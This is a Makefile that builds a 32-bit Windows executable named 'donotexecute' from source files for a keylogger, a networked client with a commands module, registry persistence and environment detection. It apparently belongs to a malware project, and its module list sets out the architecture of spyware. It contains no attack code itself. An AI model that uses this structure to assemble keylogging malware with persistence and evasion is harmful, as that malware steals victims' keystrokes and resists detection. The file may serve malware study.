
CC = C:/msys64/mingw32/bin/gcc.exe # Compiler

CFLAGS = -m32 -pedantic # -Wall # compiler flags

TARGET = donotexecute # output executable name

# source files
SRCS = \
	src/main.c \
	src/program/program.c \
	src/program/utils.c \
	src/keylogger/keylogger.c \
	src/keylogger/keypair.c \
	src/client/client.c \
	src/client/commands.c \
	src/persistence/registry.c \
	src/env_detection/env_detector.c \
	src/env_detection/env_utils.c

$(TARGET): $(SRCS)
	$(CC) $(CFLAGS) -o $(TARGET) $(SRCS) -lwininet -liphlpapi

.PHONY: clean
clean:
	-del $(TARGET).exe


	
